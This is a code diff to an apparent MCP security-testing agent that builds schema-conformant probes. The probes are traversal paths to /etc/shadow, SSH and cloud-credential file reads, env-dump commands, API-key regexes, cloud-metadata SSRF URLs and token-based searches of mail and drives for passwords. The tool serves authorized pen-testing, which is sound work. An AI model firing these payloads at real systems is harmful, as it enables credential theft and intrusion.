@@ -131,79 +131,460 @@ _AI_VENDOR_HOSTS = re.compile(
 )
 
 
-# ── Probe envelope builders ─────────────────────────────────────────────────
-# Each technique returns a list of (surface-predicate, payload) tuples.
-# The agent fires each payload against every tool surface that matches
-# the predicate. Predicates are simple substring or kind-match fns.
+# ── Schema-aware payload synthesis ─────────────────────────────────────────
+#
+# The MCP ecosystem is overwhelmingly schema-driven: every tool declares
+# its input schema (``inputSchema`` in MCP protocol terms) and any call
+# with a mismatched shape is rejected before the tool runs. Early EP-11
+# probes fired fixed shapes (``{"command": "env"}``) that matched
+# exec-style tools but bounced off path-style and url-style tools with
+# a validation error — so servers like @modelcontextprotocol/server-
+# filesystem went silent on zero findings.
+#
+# The synthesis helpers below classify each surface by its declared
+# schema and emit payloads that conform. The attack content
+# (sensitive paths, IMDS URLs, credential-hunting patterns) lands in
+# the field the tool actually reads.
+#
+# This makes EP-11 effective against:
+#   • filesystem-style servers (read_file, read_text_file, search_files)
+#   • fetch/http-style servers (fetch, url)
+#   • shell-style servers (shell_exec, run_command, bash)
+#   • code-exec servers (code_run, python_exec)
+#   • search/query servers (search_nodes, search_docs)
+#
+# Fallback: when a surface declares no schema, we still emit the legacy
+# flat-dict payloads so pre-schema labrats keep working.
 
-def _cred_surface_scan_payloads() -> list[dict]:
+_PATH_FIELDS:    tuple[str, ...] = (
+    # Single-path fields (most fs/read tools).
+    "path", "file", "file_path", "filepath", "filename",
+    "source", "source_path", "target_path",
+    # Plural — read_multiple_files(paths: string[]). The payload
+    # builder wraps scalars for array-typed fields.
+    "paths", "files",
+)
+
+# Schema properties a tool must carry for us to treat it as
+# read-only. Any tool whose name OR description signals mutation is
+# skipped by the path/command generators so engagements never leave
+# side-effects on the target's state.
+_MUTATION_NAME_TOKENS: tuple[str, ...] = (
+    "write", "edit", "delete", "create", "modify", "update",
+    "set", "put", "post", "insert", "append", "move", "rename",
+    "upload", "remove", "drop", "truncate", "overwrite",
+)
+_MUTATION_DESC_TOKENS: tuple[str, ...] = (
+    "create a new file", "completely overwrite", "make line-based edits",
+    "write the", "deletes", "removes", "modifies",
+)
+
+
+def _is_mutating_tool(surface: Surface) -> bool:
+    """True when the tool's name or description signals mutation.
+    EP-11 probes MUST be read-only so engagement runs never leave
+    persistent side-effects; the path/command generators skip these
+    tools and let other agents (TP-02, PE-07) exercise them with
+    the appropriate guards."""
+    name = surface.name.lower()
+    desc = (surface.description or "").lower()
+    for tok in _MUTATION_NAME_TOKENS:
+        if f":{tok}_" in name or f":{tok}-" in name \
+                or name.endswith(f":{tok}") or name.endswith(f"_{tok}"):
+            return True
+    for tok in _MUTATION_DESC_TOKENS:
+        if tok in desc:
+            return True
+    return False
+_URL_FIELDS:     tuple[str, ...] = (
+    "url", "endpoint", "link", "target", "href", "uri", "address",
+)
+_COMMAND_FIELDS: tuple[str, ...] = (
+    "command", "cmd", "shell", "argv", "bash",
+)
+_CODE_FIELDS:    tuple[str, ...] = (
+    "code", "source_code", "script", "snippet", "expression",
+    "python_code",
+)
+_QUERY_FIELDS:   tuple[str, ...] = (
+    "query", "q", "search", "pattern", "term", "prompt",
+    "search_query", "regex",
+)
+
+
+def _primary_field(
+    schema: dict, candidates: tuple[str, ...],
+) -> Optional[str]:
+    """Return the first candidate that exists as a top-level
+    property in the schema (case-insensitive match). None when the
+    schema declares no matching field — caller falls back to flat
+    payload or skips."""
+    props = (schema or {}).get("properties") or {}
+    if not isinstance(props, dict):
+        return None
+    props_lower = {k.lower(): k for k in props}
+    for cand in candidates:
+        hit = props_lower.get(cand.lower())
+        if hit is not None:
+            return hit
+    return None
+
+
+def _fill_required(schema: dict, already_set: dict) -> dict:
+    """Return type-appropriate defaults for any required fields not
+    yet set. Without this, plugging ``path`` into ``search_files``
+    still fails because the server demands ``pattern`` too."""
+    out: dict = {}
+    required = (schema or {}).get("required") or []
+    props    = (schema or {}).get("properties") or {}
+    if not isinstance(required, list):
+        return out
+    for field in required:
+        if field in already_set:
+            continue
+        kind = ((props.get(field, {}) or {}).get("type") or "string")
+        if   kind == "array":    out[field] = []
+        elif kind == "object":   out[field] = {}
+        elif kind in ("integer", "number"): out[field] = 0
+        elif kind == "boolean":  out[field] = False
+        else:                    out[field] = ""
+    return out
+
+
+def _schema_payload(
+    surface: Surface,
+    primary_field: str,
+    value,
+    hints: Optional[dict] = None,
+) -> dict:
+    """Build one schema-conformant dict: plug ``value`` into
+    ``primary_field``, layer in ``hints`` (caller-specific co-fields
+    like ``pattern`` for search tools), then backfill remaining
+    required fields.
+
+    If the primary field is declared as ``type: array`` (see
+    read_multiple_files(paths: string[])), wrap the scalar ``value``
+    so the payload passes schema validation."""
+    props = (surface.schema or {}).get("properties") or {}
+    primary_spec = props.get(primary_field) or {}
+    primary_type = primary_spec.get("type")
+    if primary_type == "array" and not isinstance(value, (list, tuple)):
+        value = [value]
+    payload: dict = {primary_field: value}
+    if hints:
+        payload.update(hints)
+    payload.update(_fill_required(surface.schema or {}, payload))
+    return payload
+
+
+def _path_payloads(
+    surface: Surface, paths, hints: Optional[dict] = None,
+) -> list[dict]:
+    # Skip mutating fs tools — we will not write bait files to the
+    # target's filesystem as a side-effect of a read-probing agent.
+    if _is_mutating_tool(surface):
+        return []
+    field = _primary_field(surface.schema or {}, _PATH_FIELDS)
+    if field is None:
+        return []
+    return [_schema_payload(surface, field, p, hints) for p in paths]
+
+
+def _url_payloads(
+    surface: Surface, urls, hints: Optional[dict] = None,
+) -> list[dict]:
+    field = _primary_field(surface.schema or {}, _URL_FIELDS)
+    if field is None:
+        return []
+    return [_schema_payload(surface, field, u, hints) for u in urls]
+
+
+def _command_payloads(
+    surface: Surface, commands, hints: Optional[dict] = None,
+) -> list[dict]:
+    # Exec surfaces are read-only when we only READ env/creds, but
+    # if the tool is explicitly described as mutating, skip. Most
+    # shell/run_command tools describe themselves as "execute
+    # arbitrary shell" which reads as mutating, so the gate is
+    # LESS strict here — only skip when name token signals mutation
+    # (e.g., tool:shell_write_file).
+    name = surface.name.lower()
+    for tok in _MUTATION_NAME_TOKENS:
+        if f":{tok}_" in name or f"_{tok}_" in name:
+            return []
+    field = _primary_field(surface.schema or {}, _COMMAND_FIELDS)
+    if field is None:
+        return []
+    return [_schema_payload(surface, field, c, hints) for c in commands]
+
+
+def _code_payloads(
+    surface: Surface, snippets,
+) -> list[dict]:
+    field = _primary_field(surface.schema or {}, _CODE_FIELDS)
+    if field is None:
+        return []
+    return [_schema_payload(surface, field, s) for s in snippets]
+
+
+def _query_payloads(
+    surface: Surface, queries, hints: Optional[dict] = None,
+) -> list[dict]:
+    if _is_mutating_tool(surface):
+        return []
+    field = _primary_field(surface.schema or {}, _QUERY_FIELDS)
+    if field is None:
+        return []
+    return [_schema_payload(surface, field, q, hints) for q in queries]
+
+
+# ── Sensitive-path library ─────────────────────────────────────────────────
+#
+# Covers:
+#   • bait inside a seeded sandbox (pentest shape — operator drops
+#     `credentials.env` / `internal-notes.txt` / `private/*` in the
+#     allowed root; a path-shaped tool that doesn't restrict content
+#     returns the bait verbatim and _scan_for_creds lights up).
+#   • traversal escape attempts (a hardened server rejects these; an
+#     un-hardened one leaks the parent filesystem).
+#   • absolute sensitive paths (denied by sandboxed servers, accepted
+#     by misconfigured ones — the latter are the finding).
+#   • SSH keys and cloud-credential file paths (EP-T2 / EP-T3 re-use).
+
+_SANDBOX_BAIT_PATHS: tuple[str, ...] = (
+    "credentials.env", "./credentials.env", ".env",
+    "internal-notes.txt", "config.json", "secrets.json",
+    "private/customers.csv", "private/credentials.txt",
+    ".aws/credentials", ".ssh/id_rsa",
+)
+
+_TRAVERSAL_PATHS: tuple[str, ...] = (
+    "../credentials.env", "../../etc/passwd",
+    "../../../etc/passwd", "../../../../etc/passwd",
+    "..\\..\\..\\etc\\passwd",
+    "/etc/passwd", "/etc/shadow", "/etc/hosts",
+    "/root/.bash_history", "/home/user/.bash_history",
+)
+
+_SSH_KEY_PATHS: tuple[str, ...] = (
+    "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa",
+    "~/.ssh/config", "~/.ssh/authorized_keys",
+    "/root/.ssh/id_rsa", "/home/user/.ssh/id_rsa",
+)
+
+_CLOUD_CRED_PATHS: tuple[str, ...] = (
+    "~/.aws/credentials", "~/.aws/config",
+    "~/.config/gcloud/application_default_credentials.json",
+    "~/.azure/accessTokens.json",
+    "~/.config/gh/hosts.yml",
+    "~/.netrc",
+)
+
+_SEARCH_PATTERNS: tuple[str, ...] = (
+    r"AKIA[0-9A-Z]{16}",
+    r"sk-ant-[A-Za-z0-9_\-]{20,}",
+    r"sk-(proj|svcacct)?-?[A-Za-z0-9_\-]{20,}",
+    r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
+    r"AWS_SECRET_ACCESS_KEY",
+    r"password\s*=",
+)
+
+_IMDS_URLS: tuple[str, ...] = (
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/api/token",
+    "http://metadata.google.internal/computeMetadata/v1/instance/"
+    "service-accounts/default/token",
+    "http://169.254.169.254/metadata/identity/oauth2/token"
+    "?api-version=2018-02-01&resource=https://management.azure.com/",
+)
+
+
+# ── Probe envelope builders (schema-aware) ─────────────────────────────────
+
+def _expand_paths(
+    bait: tuple[str, ...],
+    roots: tuple[str, ...],
+) -> list[str]:
+    """Combine discovered roots with bait filenames.
+
+    Pens the difference between "firing ``credentials.env``" (server
+    resolves to cwd, rejects — outside allowed root) and "firing
+    ``/private/tmp/argus-sandbox/credentials.env``" (server accepts,
+    returns AKIA content).
+
+    Always emits the literal bait + traversal entries so targets that
+    DO accept relative paths (or have different path-policy) still
+    get probed.
+    """
+    out: list[str] = list(bait)
+    for root in roots:
+        for b in bait:
+            # Skip entries that are already absolute — they're the
+            # "/etc/passwd" class; combining root/absolute makes no
+            # sense.
+            if b.startswith("/") or b.startswith("~"):
+                continue
+            joined = (
+                f"{root.rstrip('/')}/{b.lstrip('./')}"
+                if not b.startswith("/") else b
+            )
+            if joined not in out:
+                out.append(joined)
+    return out
+
+
+def _cred_surface_scan_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T1: drive sensitive paths + env-dump commands + credential
+    search patterns into whichever field shape the tool declares."""
+    out: list[dict] = []
+    # Path-shaped tools (filesystem MCP: read_file, read_text_file,
+    # list_directory). Fire bait under every discovered root + the
+    # literal library (relative + absolute classics).
+    full_bait = _expand_paths(_SANDBOX_BAIT_PATHS, ctx.allowed_roots)
+    out.extend(_path_payloads(
+        surface, full_bait + list(_TRAVERSAL_PATHS),
+    ))
+    # Command-shaped tools (shell_exec, run_command).
+    out.extend(_command_payloads(surface, [
+        "env", "printenv",
+        "env | grep -iE 'key|secret|token|aws|api'",
+        "cat ~/.aws/credentials 2>/dev/null || true",
+    ]))
+    # Search/query-shaped tools (search_files, search_nodes).
+    for pat in _SEARCH_PATTERNS:
+        hints: dict = {}
+        props = (surface.schema or {}).get("properties") or {}
+        if "path" in props:
+            # Prefer the first discovered root; fall back to "."
+            # which most servers resolve to cwd or the sandbox.
+            hints["path"] = ctx.allowed_roots[0] if ctx.allowed_roots else "."
+        out.extend(_query_payloads(surface, [pat], hints=hints))
+    if out:
+        return out
     return [
-        # Env dump probes — common shapes across exec-style tools.
         {"identity": "user:guest", "command": "env"},
         {"identity": "user:guest", "command": "printenv"},
         {"identity": "user:guest", "arg":     "env", "action": "dump"},
-        {"identity": "user:guest", "request": "dump environment",
-         "expected_format": "KEY=value"},
-        {"identity": "user:guest", "key": "*", "action": "read_all_env"},
     ]
 
 
-def _ssh_key_probe_payloads() -> list[dict]:
-    paths = [
-        "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa",
-        "~/.ssh/config", "/root/.ssh/id_rsa", "/home/user/.ssh/id_rsa",
-        "~/.ssh/authorized_keys",
-    ]
+def _ssh_key_probe_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T2: SSH-key file-read probes, schema-routed."""
+    out: list[dict] = []
+    paths = _expand_paths(_SSH_KEY_PATHS, ctx.allowed_roots)
+    out.extend(_path_payloads(surface, paths))
+    out.extend(_command_payloads(
+        surface,
+        [f"cat {p}" for p in _SSH_KEY_PATHS],
+    ))
+    if out:
+        return out
     return [
-        {"identity": "user:guest", "command": f"cat {p}",
-         "path": p, "_probe": "ssh_key"}
-        for p in paths
+        {"identity": "user:guest", "command": f"cat {p}", "path": p}
+        for p in _SSH_KEY_PATHS
     ]
 
 
-def _cloud_cred_probe_payloads() -> list[dict]:
+def _cloud_cred_probe_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T3: cloud-credential file-read + CLI-dump, schema-routed."""
+    out: list[dict] = []
+    paths = _expand_paths(_CLOUD_CRED_PATHS, ctx.allowed_roots)
+    out.extend(_path_payloads(surface, paths))
+    out.extend(_command_payloads(surface, [
+        "env | grep -i aws_",
+        "gcloud auth list",
+        "aws sts get-caller-identity",
+    ]))
+    if out:
+        return out
     return [
+        {"identity": "user:guest", "path": p} for p in _CLOUD_CRED_PATHS
+    ] + [
         {"identity": "user:guest", "command": "env | grep -i aws_"},
-        {"identity": "user:guest", "path":    "~/.aws/credentials"},
-        {"identity": "user:guest", "path":    "~/.config/gcloud/application_default_credentials.json"},
-        {"identity": "user:guest", "path":    "~/.azure/accessTokens.json"},
         {"identity": "user:guest", "command": "gcloud auth list"},
-        {"identity": "user:guest", "command": "aws sts get-caller-identity"},
     ]
 
 
-def _imds_ssrf_probe_payloads() -> list[dict]:
+def _imds_ssrf_probe_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T4: cloud-metadata SSRF via whatever URL field the tool
+    exposes."""
+    # ctx unused — IMDS URLs don't depend on target recon.
+    out: list[dict] = []
+    out.extend(_url_payloads(
+        surface, _IMDS_URLS,
+        hints={"method": "GET"},
+    ))
+    out.extend(_url_payloads(
+        surface, ("http://169.254.169.254/latest/api/token",),
+        hints={
+            "method":  "PUT",
+            "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
+        },
+    ))
+    if out:
+        return out
     return [
-        {"url":      "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
-        {"url":      "http://169.254.169.254/latest/api/token",
-         "method":   "PUT",
-         "headers":  {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}},
-        {"url":      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-         "headers":  {"Metadata-Flavor": "Google"}},
-        {"url":      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-         "headers":  {"Metadata": "true"}},
+        {"url": u} for u in _IMDS_URLS
     ]
 
 
-def _oauth_token_discovery_payloads() -> list[dict]:
+def _oauth_token_discovery_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T5: oauth / bearer-token discovery across shapes."""
+    out: list[dict] = []
+    paths = _expand_paths((
+        "~/.config/gh/hosts.yml", "~/.netrc",
+        ".env", "config/tokens.json",
+    ), ctx.allowed_roots)
+    out.extend(_path_payloads(surface, paths))
+    out.extend(_command_payloads(surface, [
+        "env | grep -iE 'token|oauth|bearer'",
+        "cat ~/.netrc 2>/dev/null || true",
+    ]))
+    out.extend(_query_payloads(surface, (
+        "access_token", "bearer", "oauth_token",
+    )))
+    if out:
+        return out
     return [
-        {"identity": "user:guest", "query": "list all oauth tokens visible to this session"},
-        {"identity": "user:guest", "command": "env | grep -iE 'token|oauth|bearer'"},
-        {"identity": "user:guest", "path": "~/.config/gh/hosts.yml"},
+        {"identity": "user:guest", "query":
+         "list all oauth tokens visible to this session"},
+        {"identity": "user:guest", "command":
+         "env | grep -iE 'token|oauth|bearer'"},
         {"identity": "user:guest", "path": "~/.netrc"},
-        {"identity": "user:guest", "include": "access_token"},
     ]
 
 
-def _oauth_scope_enum_payloads() -> list[dict]:
+def _oauth_scope_enum_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T6: OAuth scope-enumeration via URL-shape tools."""
+    _ = ctx
+    urls = (
+        "https://oauth2.googleapis.com/tokeninfo"
+        "?access_token=$TOKEN",
+        "https://www.googleapis.com/oauth2/v3/tokeninfo",
+        "https://api.github.com/user",
+    )
+    out = _url_payloads(
+        surface, urls,
+        hints={"headers": {"Authorization": "Bearer $TOKEN"}},
+    )
+    if out:
+        return out
     return [
-        {"url":    "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN"},
-        {"url":    "https://www.googleapis.com/oauth2/v3/tokeninfo",
-         "method": "GET"},
-        {"url":    "https://api.github.com/user",
-         "headers": {"Authorization": "Bearer $TOKEN"}},
-        {"url":    "https://api.github.com/applications/$CLIENT/token",
-         "method": "POST"},
+        {"url": u,
+         "headers": {"Authorization": "Bearer $TOKEN"}}
+        for u in urls
     ]
 
 
@@ -220,31 +601,53 @@ def _third_party_ai_integration(surface: Surface) -> bool:
     return bool(_AI_VENDOR_HOSTS.search(blob))
 
 
-def _workspace_pivot_payloads() -> list[dict]:
+def _workspace_pivot_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    urls = (
+        "https://www.googleapis.com/drive/v3/files?pageSize=100",
+        "https://gmail.googleapis.com/gmail/v1/users/me/messages"
+        "?q=password",
+        "https://graph.microsoft.com/v1.0/me/drive/root/children",
+        "https://graph.microsoft.com/v1.0/me/messages"
+        "?$top=100&$search=\"password\"",
+    )
+    out = _url_payloads(
+        surface, urls,
+        hints={"headers": {"Authorization": "Bearer $TOKEN"}},
+    )
+    if out:
+        return out
     return [
-        {"url":      "https://www.googleapis.com/drive/v3/files?pageSize=100",
-         "headers":  {"Authorization": "Bearer $TOKEN"}},
-        {"url":      "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=password",
-         "headers":  {"Authorization": "Bearer $TOKEN"}},
-        {"url":      "https://graph.microsoft.com/v1.0/me/drive/root/children",
-         "headers":  {"Authorization": "Bearer $TOKEN"}},
-        {"url":      "https://graph.microsoft.com/v1.0/me/messages?$top=100&$search=\"password\"",
-         "headers":  {"Authorization": "Bearer $TOKEN"}},
+        {"url": u, "headers": {"Authorization": "Bearer $TOKEN"}}
+        for u in urls
     ]
 
 
-def _paas_envvar_pivot_payloads() -> list[dict]:
+def _paas_envvar_pivot_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    urls = (
+        "https://api.vercel.com/v9/projects/$PROJECT/env",
+        "https://api.netlify.com/api/v1/accounts/$ACCOUNT/env",
+        "https://api.cloudflare.com/client/v4/accounts/"
+        "$ACCOUNT/workers/scripts",
+    )
+    out = _url_payloads(
+        surface, urls,
+        hints={"headers": {"Authorization": "Bearer $TOKEN"}},
+    )
+    if out:
+        return out
     return [
-        {"url":     "https://api.vercel.com/v9/projects/$PROJECT/env",
-         "headers": {"Authorization": "Bearer $TOKEN"}},
-        {"url":     "https://api.netlify.com/api/v1/accounts/$ACCOUNT/env",
-         "headers": {"Authorization": "Bearer $TOKEN"}},
-        {"url":     "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT/workers/scripts",
-         "headers": {"Authorization": "Bearer $TOKEN"}},
+        {"url": u, "headers": {"Authorization": "Bearer $TOKEN"}}
+        for u in urls
     ]
 
 
-def _code_run_pivot_payloads() -> list[dict]:
+def _code_run_pivot_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
     """
     EP-T11 — code-run pivot. Targets GenericAgent-class ``code_run``
     (and equivalent `run_code` / `python_exec` / `eval`) surfaces —
@@ -259,34 +662,58 @@ def _code_run_pivot_payloads() -> list[dict]:
     payloads read local state only so the probe is safe to fire in
     pen-test engagements.
     """
-    return [
+    snippets = (
         # Snippet A — environment dump via Python stdlib.
-        {"code": "import os; print('\\n'.join(f'{k}={v}' for k, v "
-                 "in os.environ.items()))"},
+        "import os; print('\\n'.join(f'{k}={v}' for k, v "
+        "in os.environ.items()))",
         # Snippet B — IMDSv2 reachability check via Python.
-        {"code": "import urllib.request as u, json; "
-                 "r = u.urlopen('http://169.254.169.254/latest/api/"
-                 "token', timeout=1); print(r.read()[:200])"},
+        "import urllib.request as u, json; "
+        "r = u.urlopen('http://169.254.169.254/latest/api/"
+        "token', timeout=1); print(r.read()[:200])",
         # Snippet C — known SaaS credential file read.
-        {"code": "import pathlib; "
-                 "p = pathlib.Path.home() / '.aws' / 'credentials'; "
-                 "print(p.read_text()[:400] if p.exists() else 'no-aws')"},
+        "import pathlib; "
+        "p = pathlib.Path.home() / '.aws' / 'credentials'; "
+        "print(p.read_text()[:400] if p.exists() else 'no-aws')",
         # Snippet D — request to pip / distinct install surface (the
         # autonomous-agent "crystallise a tool" hazard).
-        {"code": "import subprocess; "
-                 "print(subprocess.run(['pip', 'list', '--format=freeze'], "
-                 "capture_output=True, text=True).stdout[:400])"},
-    ]
+        "import subprocess; "
+        "print(subprocess.run(['pip', 'list', '--format=freeze'], "
+        "capture_output=True, text=True).stdout[:400])",
+    )
+    out = _code_payloads(surface, snippets)
+    if out:
+        return out
+    return [{"code": s} for s in snippets]
 
 
 # ── Technique registry ──────────────────────────────────────────────────────
+
+@dataclass
+class ProbeContext:
+    """Per-run context threaded into every payload generator.
+
+    ``allowed_roots`` — absolute path prefixes the target accepts
+    (discovered via ``list_allowed_directories`` or equivalent
+    recon probe at run start). Path-shaped probes prepend each
+    root to every bait filename so ``/private/tmp/argus-sandbox``
+    receives ``/private/tmp/argus-sandbox/credentials.env`` instead
+    of a relative ``credentials.env`` that the server rejects.
+    Empty when recon returned nothing — path generators then fall
+    back to the literal path library (relative + absolute classics).
+    """
+    allowed_roots: tuple[str, ...] = ()
+
 
 @dataclass
 class Technique:
     id:             str
     family:         str
     kind:           str            # "probe" | "catalog_audit"
-    payload_fn:     Optional[Callable[[], list[dict]]] = None
+    # Payload functions receive the live Surface AND a ProbeContext
+    # carrying per-run reconnaissance (e.g. discovered fs roots) so
+    # they can emit payloads that actually conform to the target's
+    # access policy — not just its schema.
+    payload_fn:     Optional[Callable[[Surface, ProbeContext], list[dict]]] = None
     surface_pred:   Optional[Callable[[Surface], bool]] = None
     surface_match:  Optional[Callable[[Surface], bool]] = None
     severity:       str = "CRITICAL"
@@ -534,6 +961,15 @@ class EnvironmentPivotAgent(BaseAgent):
         result.surfaces_audited = len(surfaces)
         consecutive_failures = 0
 
+        # 0) Recon: discover allowed fs roots so path probes land
+        # within the target's access policy, not just its schema.
+        # Zero-cost on targets that don't expose a listing tool.
+        try:
+            allowed_roots = await self._discover_roots(surfaces)
+        except Exception:
+            allowed_roots = ()
+        ctx = ProbeContext(allowed_roots=allowed_roots)
+
         # 1) Catalog audits (cheap; no network traffic).
         for technique_id in self.techniques_to_fire:
             tech = TECHNIQUES[technique_id]
@@ -560,7 +996,7 @@ class EnvironmentPivotAgent(BaseAgent):
                 try:
                     findings = await self._fire_probe(
                         technique_id=technique_id, tech=tech,
-                        surface=surface, target_id=target_id,
+                        surface=surface, target_id=target_id, ctx=ctx,
                     )
                 except AdapterError as e:
                     consecutive_failures += 1
@@ -599,6 +1035,76 @@ class EnvironmentPivotAgent(BaseAgent):
         adapter = self.adapter_factory()
         async with adapter:
             return await adapter.enumerate()
+
+    async def _discover_roots(
+        self, surfaces: list[Surface],
+    ) -> tuple[str, ...]:
+        """Recon pass: call any zero-arg listing tool the target
+        exposes and parse its response for absolute path strings.
+        These become the ``ctx.allowed_roots`` that path-shaped
+        probes prepend to every bait filename.
+
+        Scored this way because it's a universal MCP-ecosystem
+        primitive: filesystem-ref, git, github-ref, memory — most
+        servers that accept path inputs expose a discovery tool
+        that declares which roots they trust. A probe that doesn't
+        use that discovery shoots blind and misses every landed
+        credential bait seeded in the sandbox.
+
+        Returns an empty tuple when nothing is discovered; probes
+        still fire the literal path library then (absolute classics
+        + traversal).
+        """
+        candidate_names = (
+            "tool:list_allowed_directories",
+            "tool:list_roots",
+            "tool:list_directories",
+            "tool:allowed_directories",
+        )
+        # Find a zero-arg listing tool — must be non-mutating.
+        target_surface: Optional[Surface] = None
+        for s in surfaces:
+            if s.name.lower() in candidate_names:
+                schema = s.schema or {}
+                props  = schema.get("properties") or {}
+                required = schema.get("required") or []
+                if not required and not props:
+                    target_surface = s
+                    break
+        if target_surface is None:
+            return ()
+
+        # Fire the recon probe.
+        adapter = self.adapter_factory()
+        try:
+            async with adapter:
+                obs = await adapter.interact(
+                    Request(surface=target_surface.name, payload={}),
+                )
+        except Exception:
+            return ()
+
+        # Parse response text for absolute path strings. Accept both
+        # the typed-response ("Allowed directories:\n- /path\n- /other")
+        # shape and raw arrays.
+        body = str(obs.response.body or "")
+        # Find /-prefixed paths on any line.
+        roots: list[str] = []
+        for line in body.splitlines():
+            line = line.strip().lstrip("- ").strip()
+            if line.startswith("/") and " " not in line:
+                roots.append(line)
+        # Dedup preserving order.
+        seen: set[str] = set()
+        dedup: list[str] = []
+        for r in roots:
+            if r in seen:
+                continue
+            seen.add(r)
+            dedup.append(r)
+        if dedup and self.verbose:
+            print(f"  [{self.AGENT_ID}] discovered roots: {dedup}")
+        return tuple(dedup)
 
     def _catalog_finding(
         self, *, technique_id: str, tech: Technique,
@@ -645,8 +1151,9 @@ class EnvironmentPivotAgent(BaseAgent):
     async def _fire_probe(
         self, *, technique_id: str, tech: Technique,
         surface: Surface, target_id: str,
+        ctx: ProbeContext,
     ) -> list[tuple]:
-        payloads = tech.payload_fn() if tech.payload_fn else []
+        payloads = tech.payload_fn(surface, ctx) if tech.payload_fn else []
         if not payloads:
             return []
 
